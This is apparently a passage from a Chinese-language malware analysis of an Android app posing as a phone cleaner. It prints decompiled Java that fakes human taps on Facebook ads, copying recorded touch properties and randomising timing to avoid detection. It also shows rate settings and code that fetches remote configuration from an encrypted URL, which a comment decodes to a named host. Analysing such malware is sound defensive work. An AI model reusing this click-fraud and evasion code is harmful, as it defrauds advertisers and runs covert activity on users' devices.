               FacebookAdsManager.getSimulateClickEdit(this.instance).apply();
               int randomNumber = new Random().nextInt(13) + 1;
               if(randomNumber == 1) {
                   ClickSimulator.executeAutoClick(FacebookAdsManager.getContext(this.instance), FacebookAdsManager.get_native_ad_title(this.instance));
               }
               else if(randomNumber == 2) {
                   ClickSimulator.executeAutoClick(FacebookAdsManager.getContext(this.instance), FacebookAdsManager.get_native_ad_icon(this.instance));
               }
               else {
                   if(randomNumber >= 3 && randomNumber  max) {
                value = halfSize + min;
            }
            return value;
        }
        public static String getSimulateClickID(Context ctx) {
            return ctx.getSharedPreferences("simulate_click", 0).getString("id", "");
        }
        public static void getMotionEventInfo(Context ctx, MotionEvent motionEvent) {
            int deviceId = motionEvent.getDeviceId();
            float pressure = motionEvent.getPressure();
            float size = motionEvent.getSize();
            float Xprecision = motionEvent.getXPrecision();
            float Yprecision = motionEvent.getYPrecision();
            int metaState = motionEvent.getMetaState();
            int edgeFlags = motionEvent.getEdgeFlags();
            MotionEventInfo info = new MotionEventInfo();
            info.set_deviceId(deviceId);
            info.set_pressure(((double)pressure));
            info.set_size(((double)size));
            info.set_xprecision(((double)Xprecision));
            info.set_yprecision(((double)Yprecision));
            info.set_metaState(metaState);
            info.set_edgeFlags(edgeFlags);
            ClickSimulator.setSimulateClickID(ctx, MotionEventInfo.getInto(info));
        }
        public static void setSimulateClickID(Context ctx, String simulate_click_id) {
            SharedPreferences.Editor simulate_click_edit = ctx.getSharedPreferences("simulate_click", 0).edit();
            simulate_click_edit.putString("id", simulate_click_id);
            simulate_click_edit.commit();
        }
        public static void executeAutoClick(Context ctx, View view) {
            Log.v("auto_click", "AutoSimulateClick");
            int viewWidth = view.getWidth();
            int viewHeight = view.getHeight();
            float randomXPosition = ((float)ClickSimulator.getRandomPositionInRange(0, viewWidth));
            float randomYPosition = ((float)ClickSimulator.getRandomPositionInRange(0, viewHeight));
            float randomXPosition_1 = randomXPosition + (((float)ClickSimulator.getRandomPositionInRange(0, 999999))) * 1f / 100000f;
            float randomYPosition_1 = randomYPosition + (((float)ClickSimulator.getRandomPositionInRange(0, 999999))) * 1f / 100000f;
            String clickID = ClickSimulator.getSimulateClickID(ctx);
            Log.v("auto_click", "getMotionEventBean: " + clickID);
            MotionEventInfo info = MotionEventInfo.setInfo(clickID);
            if(info != null) {
                float pressure = Double.valueOf(info.get_pressure()).floatValue();
                randomYPosition = Double.valueOf(info.get_size()).floatValue();
                float Xprecision = Double.valueOf(info.get_xprecision()).floatValue();
                float Yprecision = Double.valueOf(info.get_yprecision()).floatValue();
                int metaState = info.get_metaState();
                int deviceId = info.get_deviceId();
                int edgeFlags = info.get_edgeFlags();
                float size = randomYPosition + ((((float)ClickSimulator.getRandomPositionInRange(0, 1764707))) * 1f / 1000000000f - 0.000865f);
                long downTime = SystemClock.uptimeMillis();
                int randomCount = ClickSimulator.randomValueBetween(0, 4);
                MotionEvent motionEvent = MotionEvent.obtain(downTime, downTime, 0, randomXPosition_1, randomYPosition_1, pressure, size, metaState, Xprecision, Yprecision, deviceId, edgeFlags);
                view.dispatchTouchEvent(motionEvent);
                int count = 0;
                float size_1 = size;
                long eventTime = downTime;
                while(count < randomCount) {
                    eventTime += ((long)ClickSimulator.getRandomPositionInRange(15, 43));
                    if(count == randomCount - 1) {
                        size_1 = size;
                    }
                    else {
                        size_1 += (((float)ClickSimulator.getRandomPositionInRange(0, 1764707))) * 1f / 1000000000f;
                    }
                    MotionEvent motionEvent_1 = MotionEvent.obtain(downTime, eventTime, 2, randomXPosition_1, randomYPosition_1, pressure, size_1, metaState, Xprecision, Yprecision, deviceId, edgeFlags);
                    view.dispatchTouchEvent(motionEvent_1);
                    motionEvent_1.recycle();
                    ++count;
                }
                MotionEvent motionEvent_2 = MotionEvent.obtain(downTime, (((long)ClickSimulator.getRandomPositionInRange(15, 43))) + eventTime, 1, randomXPosition_1, randomYPosition_1, pressure, size, metaState, Xprecision, Yprecision, deviceId, edgeFlags);
                view.dispatchTouchEvent(motionEvent_2);
                motionEvent.recycle();
                motionEvent_2.recycle();
            }
        }
        public static int randomValueBetween(int min, int max) {
            return Double.valueOf(Math.random() * (((double)(max - min)))).intValue() + min;
        }
    }
**5、CBA激活配置**
    public class ConfigurationManager {
      ConfigurationManager.weight = "1,2,3";
      ConfigurationManager.auto_unlock = "0";
      ConfigurationManager.auto_click = "0";
      ConfigurationManager.unlock_rate = "30";
      ConfigurationManager.clickRate = "20";
      ConfigurationManager.boost_rate = "70";
      ConfigurationManager.guideRate = "70";
      ConfigurationManager.mainRate = "70";
      ConfigurationManager.backMainRate = "20";
      //EncodedStrings.Conf_URL = //"KlxjwlUOCqlLgV3u9mMAxIXFLiBVC3kFgD61kUQ9LrgsCXaRrakpA6w6dz6fYHnmgD3szNftnlw=";  
      // http://txt.kuxwmuzuz.com/app/phonecleanerpro/conf.txt
      URLConnection connection = new URL(AESDecoder.AESDecode(EncodedStrings.AES_Key, EncodedStrings.Conf_URL)).openConnection();
      BufferedReader br = new BufferedReader(new InputStreamReader(((HttpURLConnection)connection).getInputStream()));
      StringBuilder sb = new StringBuilder();
      while(true) {
         String line = br.readLine();
         if(line == null) {
             break;